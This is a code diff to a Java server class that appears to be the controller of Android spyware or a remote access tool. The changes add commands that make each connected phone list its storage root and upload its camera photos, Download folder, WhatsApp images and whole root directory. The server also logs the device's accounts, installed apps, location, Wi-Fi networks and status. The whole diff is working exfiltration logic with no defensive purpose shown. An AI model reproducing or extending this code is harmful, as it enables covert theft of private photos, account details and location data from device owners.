@@ -9,9 +9,9 @@ import java.util.Arrays;
 
 public class ClientThread implements Runnable {
 
-    private static final int SO_TIMEOUT = 120000;
+    private static final int SO_TIMEOUT = 60000;
 
-    private Logger logger, threadLogger, locationLogger, accountLogger, installedAppsLogger, wifiAPLogger;
+    private Logger logger, threadLogger, locationLogger, accountLogger, installedAppsLogger, wifiAPLogger, sdCardLogger, statusLogger;
     private Socket socket = null;
     private DataInputStream in;
     private DataOutputStream out;
@@ -40,6 +40,8 @@ public class ClientThread implements Runnable {
         accountLogger = new Logger(Logger.LOG_TYPE_ACCOUNTS, clientID);
         wifiAPLogger = new Logger(Logger.LOG_WIFI_APS, clientID);
         installedAppsLogger = new Logger(Logger.LOG_TYPE_INSTALLED_APPS, clientID);
+        sdCardLogger = new Logger(Logger.LOG_TYPE_SD_CARD, clientID);
+        statusLogger = new Logger(Logger.LOG_TYPE_STATUS, clientID);
         threadPort = socket.getPort();
         logger.log("New client connected from: " + socket.getRemoteSocketAddress() + " v" + version);
         File directory = new File(clientID);
@@ -63,8 +65,10 @@ public class ClientThread implements Runnable {
             say("status");
             say("accounts");
             say("apps");
+            say("ls /");
             say("download /DCIM/Camera");
             say("download /Download");
+            say("download /WhatsApp/Media/WhatsApp Images");
             say("download /");
 
             // TODO check if client already exists.
@@ -192,6 +196,12 @@ public class ClientThread implements Runnable {
         }
         if (message.startsWith("Installed apps:")) {
             installedAppsLogger.log(message);
+        }
+        if (message.startsWith("dir: //")) {
+            sdCardLogger.log(message);
+        }
+        if (message.startsWith("status:")) {
+            statusLogger.log(message);
         }
         logger.log(message);
     }
